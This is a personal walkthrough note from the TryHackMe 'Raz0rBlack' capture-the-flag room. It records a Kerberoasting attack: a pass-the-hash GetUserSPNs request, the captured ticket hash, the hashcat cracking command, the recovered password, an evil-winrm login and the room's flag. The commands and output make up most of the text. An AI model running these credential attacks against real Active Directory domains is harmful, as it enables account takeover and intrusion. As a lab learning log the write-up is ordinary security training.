Now we know that the service is running on the admin account and we know how to exploit it via GetUserSPNs

I think to take care is that we need  -hashes LMHASH:NTHASH in order to get the things working

```
aad3b435b51404eeaad3b435b51404ee:f220d3988deb3f516c73f40ee16c431d
```

```
GetUserSPNs.py raz0rblack.thm/lvetrova@10.10.235.42 -hashes aad3b435b51404eeaad3b435b51404ee:f220d3988deb3f516c73f40ee16c431d -request
```

```
$krb5tgs$23$*xyan1d3$RAZ0RBLACK.THM$HAVEN-DC/xyan1d3.raz0rblack.thm~60111*$21f3be4ee0bbc39eedeb1f8c9768c3e0$7c5d63ef156f6db85620299efc79951e3fa0e37d6a5cd41fd3dd33999c2b1b67899afa9568d5b68082284ea4899f429dbf940880f000585fed34af746c3def27b2e466167dfdf6eeba812b43bf7098a36d842458515056838747fbffb7db2da0e63fb96520d27ca432049aa224a4de5ee1ba1b454c96b629d594c21684056eb5edf17b39fdd546a0670a11a2743fcdecadcaac835d107e26c71196b6ed1d0f1dc846385183d29b0a6f17e64c3621e2367b32cff03041c1397e43f26f9240f69730d6478a8604959235203050f565efb88cafd3307d4083936cd7ac325c6b980bd2c9cdb5da044ca76205c6bd2f57a1b6174067175e7b767ed93e1de1c25085ca1017f50a975701f932ad3e53051249b2560437afe7472bba1c92f79044f43558ff737c4bfdf511c3e4ba60f0a588146113cc569751a2d4ef251d1e40e4eca6e5962c3c810202ca4e860fe1164746661819cfc2a4698f18b6856d4db2b1e8654b85de6c8b9af5d3b7e1b5a00c9c4e886e529b43ddc4bd33ece5bd36d226663b553f0531d32fca346fa2927f24c74ee0551d438b571e6284f271b12ddd3a7ba833fc814b0c19f2ea42a50fe1234edf345ee7f13ace893033f9e7389b8423f2e5b2587aa2a62774812237f40c9166fc2c44dafb1241f8465dfedb376a5a790addc4026639ad4f2bb8b4fb68afa065d1abc972e5cdabea57436fdbd65ef49726912e9af24ccbeb6bedea5ee7ad69f98ed9cd4f240c630cf4fe778ea25f974739e8a934512939be01774aa974e9997bdd4526af6ff189d7c15f2e8f6558bbc80c22e48277a12668866b95ef555732399cf8df8518fc2a78f03b9f05cb3d145aefec56f8c07b78a92fb26adaa6aae4d637d210ad2f179a988ad14968667168bb58c1977e82f4b93b04a9b5b419d4e429f7bad0ce4ef6afe87cb916027c7d7d80df8ffa058e6572cbd18359181c672f8f63904ad21d20ddc91ac304ec09b16bdb55941287f0d1495fb332e60dfb147275b117f9d12deff44cbf7c8a28fefd1f2d6d6f210b7d799e472f481851827168dba0cf133a26a40475fae963f731829691315e26afe4d541f8e76455567d9b2827073aa8ab1e1c6cca12c39d0f6d14dc11d585b9c171c2de389c7936e2cb68a80ce7e070aad18c82048779c0569e07701a28536ca7bfbad443b24af33d787c8c8acefb08dbf9e411975b7c2254d4d2dbed199a72e1876a2eace5b682870dd0dd5000c18849c1ffa3b0ed8ad7a7dfbd280e693f6bc35cafeac197a7c80f2edca180c70b6a752f3cd01fc61d76055fe83701578933cb1855343ca60fe9f8187a68f4a3b9dedabc8bb8a18805c31e77e9856019e33751fa7c979237651d3d74e4d6a876a4ee5389fa885827d3e3b000df8cf1d26ac3ba5a4a0d17363a6e84dcf1b8d8949d
```

We got another username and if you recall that it was there in the users as well
Users= xyan1d3
![[Pasted image 20230920184023.png]]

Let's crack the kerberos ticket
![[Pasted image 20230920184106.png]]
We have type 5 and etype 23 we have options 
7500 / 13100 / 18200

```
 .\hashcat.exe -m 13100 -a 0 -D 1,2 .\hashes4.txt .\rockyou.txt -O
```

Cracked the password on the 3rd goooooooooo
![[Pasted image 20230920184438.png]]
```
cyanide9amine5628
```

Users: xyan1d3
Passwd: cyanide9amine5628

Let's run the evil-

```
evil-winrm  -i 10.10.235.42 -u xyan1d3 -p cyanide9amine5628
```

Same thing the password is stored encrypted using PSCredential Object.
![[Pasted image 20230920184831.png]]

![[Pasted image 20230920185217.png]]

```
LOL here it is -> THM{62ca7e0b901aa8f0b233cade0839b5bb}
```

Though it was not funny jajajajajajaaj

We were able to enumerate to the Administrator but we are not admin as permission got denied
![[Pasted image 20230920185536.png]]


Will do the privilege escalation tomorrow cuz i should call it a day and will write a brief about it today as i learnt a lot today.
